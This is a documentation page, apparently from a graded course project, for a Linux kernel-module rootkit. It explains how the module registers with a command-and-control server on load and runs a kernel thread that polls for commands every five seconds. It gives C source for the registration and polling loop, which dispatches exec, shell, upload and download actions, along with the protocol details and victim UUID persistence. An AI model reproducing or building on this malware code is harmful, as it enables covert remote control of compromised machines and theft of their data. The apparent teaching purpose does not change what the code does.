---
title: Connection & Polling
description: The rootkit registers with the C2 on load and spawns a kernel thread that polls for actions every 5 seconds.
---

**Mandatory · 3 pts**

The rootkit registers with the C2 on load and spawns a kernel thread that polls for actions every 5 seconds.

## How it works

When `insmod wlkom.ko c2_host=<IP>` is run, `c2_init()` is called. It first checks if a UUID file already exists at `/rootkit/uuid`. If not, it sends `GET /register` to the C2, receives a fresh UUID, and saves it. It then spawns a **kernel thread** (`kthread`) that loops indefinitely, polling `GET /api/<uuid>/action` every 5 seconds.

The C2 server responds with `HTTP 204` (no content) when there is nothing to do, or with the action string (e.g. `exec:ls -la`) as plain text with `HTTP 200`. All communication uses **HTTP/1.0** — one TCP connection per request, closed immediately after.

## Key details

| Property | Value |
|----------|-------|
| Protocol | HTTP/1.0 over TCP |
| C2 port | 5000 |
| Poll interval | 5 seconds |
| UUID storage | `/rootkit/uuid` |
| Thread | `kthread_run()` |
| No-action response | HTTP 204 |

## Implementation

```c
// rootkit/src/c2.c

int c2_init(void) {
    ensure_rootkit_dir();
    resolve_host(c2_host, &c2_addr);

    // Reuse existing UUID if already registered
    if (read_file(UUID_FILE, c2_uuid, UUID_LEN) < 36)
        do_register();       // GET /register → save UUID

    // Spawn polling kthread
    c2_task = kthread_run(c2_poll_fn, NULL, "c2_poll");
    return 0;
}

static int c2_poll_fn(void *data) {
    while (!kthread_should_stop()) {
        char action[256] = {0};
        int  status = http_get_action(c2_uuid, action, sizeof(action));

        if (status == 200 && action[0])
            handle_action(action);   // exec:... / shell:... / upload:... / download:...

        ssleep(5);   // wait 5 seconds before next poll
    }
    return 0;
}
```

:::note[UUID persistence]
The UUID is saved to `/rootkit/uuid` on first registration. On subsequent `insmod` calls, the file is read and the C2 registration step is skipped. This ensures the same victim machine keeps the same identity across rootkit reloads.
:::
